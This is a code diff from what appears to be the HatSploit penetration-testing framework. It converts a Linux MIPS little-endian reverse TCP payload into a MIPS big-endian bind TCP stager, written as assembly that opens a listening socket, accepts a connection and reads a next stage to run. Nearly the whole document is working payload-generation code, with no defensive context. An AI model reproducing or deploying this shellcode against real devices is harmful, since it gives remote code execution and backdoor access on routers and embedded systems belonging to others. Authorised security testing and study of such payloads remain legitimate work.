@@ -9,32 +9,32 @@ from hatsploit.lib.core.payload.basic import *
 class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__({
-            'Name': "Linux mipsle Reverse TCP",
-            'Payload': "linux/mipsle/reverse_tcp",
+            'Name': "Linux mipsbe Bind TCP",
+            'Payload': "linux/mipsbe/bind_tcp",
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
             'Description': (
-                "This payload creates an interactive reverse TCP connection for Linux "
-                "with MIPS little-endian architecture and reads next phase."
+                "This payload creates an interactive bind TCP connection for Linux "
+                "with MIPS big-endian architecture and reads next stage."
             ),
-            'Arch': ARCH_MIPSLE,
+            'Arch': ARCH_MIPSBE,
             'Platform': OS_LINUX,
-            'Type': REVERSE_TCP,
+            'Type': BIND_TCP,
         })
 
-        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
+        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                       False, advanced=True)
-        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
+        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                     False, advanced=True)
 
     def run(self):
         assembly = """
         start:
-            addiu   $t7, $zero, -6
-            not     $t7, $t7
-            addi    $a0, $t7, -3
-            addi    $a1, $t7, -3
+            addiu   $sp, $sp, -0x20
+            addiu   $t6, $zero, -3
+            not     $a0, $t6
+            not     $a1, $t6
             slti    $a2, $zero, -1
             addiu   $v0, $zero, 0x1057
             syscall 0x40404
@@ -47,22 +47,61 @@ class HatSploitPayload(Payload, Handler):
             """
 
         assembly += f"""
-            sw      $v0, -4($sp)
-            lw      $a0, -4($sp)
-            ori     $t7, $zero, 0xfffd
-            not     $t7, $t7
-            sw      $t7, -0x20($sp)
-            lui     $t6, 0x{self.rport.little.hex()}
-            ori     $t6, $t6, 0x{self.rport.little.hex()}
-            sw      $t6, -0x1c($sp)
-            lui     $t6, 0x{self.rhost.little[:2].hex()}
-            ori     $t6, $t6, 0x{self.rhost.little[2:].hex()}
-            sw      $t6, -0x1a($sp)
-            addiu   $a1, $sp, -0x1e
-            addiu   $t4, $zero, -0x11
-            not     $a2, $t4
-            addiu   $v0, $zero, 0x104a
+            andi    $s0, $v0, 0xffff
+            addiu   $t6, $zero, -0x11
+            not     $t6, $t6
+            addiu   $t5, $zero, -3
+            not     $t5, $t5
+            sllv    $t5, $t5, $t6
+            addiu   $t6, $zero, 0x{self.rport.big.hex()}
+            or      $t5, $t5, $t6
+            sw      $t5, -0x20($sp)
+            sw      $zero, -0x1c($sp)
+            sw      $zero, -0x18($sp)
+            sw      $zero, -0x14($sp)
+            or      $a0, $s0, $s0
+            addiu   $t6, $zero, -0x11
+            not     $a2, $t6
+            addi    $a1, $sp, -0x20
+            addiu   $v0, $zero, 0x1049
             syscall 0x40404
+        """
+
+        if self.reliable.value:
+            assembly += """
+                slt $s0, $zero, $a3
+                bne $s0, $zero, fail
+            """
+
+        assembly += """
+            or      $a0, $s0, $s0
+            addiu   $a1, $zero, 0x101
+            addiu   $v0, $zero, 0x104e
+            syscall 0x40404
+        """
+
+        if self.reliable.value:
+            assembly += """
+                slt $s0, $zero, $a3
+                bne $s0, $zero, fail
+            """
+
+        assembly += """
+            or      $a0, $s0, $s0
+            slti    $a1, $zero, -1
+            slti    $a2, $zero, -1
+            addiu   $v0, $zero, 0x1048
+            syscall 0x40404
+        """
+
+        if self.reliable.value:
+            assembly += """
+                slt $s0, $zero, $a3
+                bne $s0, $zero, fail
+            """
+
+        assembly += """
+            sw $v0, -4($sp)
         """
 
         if not self.length.value:
@@ -161,4 +200,4 @@ class HatSploitPayload(Payload, Handler):
                 syscall 0x40404
             """
 
-        return self.assemble(assembly)
+        return self.__asm__(assembly)
